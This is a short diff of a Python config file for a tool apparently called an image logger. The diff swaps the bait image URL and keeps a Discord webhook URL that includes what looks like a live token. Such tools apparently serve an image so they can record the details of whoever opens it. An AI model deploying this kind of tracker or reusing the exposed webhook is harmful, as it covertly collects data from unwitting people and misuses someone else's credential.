@@ -14,7 +14,7 @@ __author__ = "Tuggzy"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1339865265336483860/ilXTfuMAST7MA1Y1do1lpILuFKCoHjgo8l6csk31a9EgmhecVt89AYH1hGMcGEov1Gs_",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/6751f3e2cc86f442c5b2bf09/The-Grinch-knee-surgery-meme/0x0.jpg", # You can also have a custom image by using a URL argument
+    "image": "blob:https://imgupscaler.com/b11d0369-79d1-42b1-9cd8-7e120fd96d7b", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
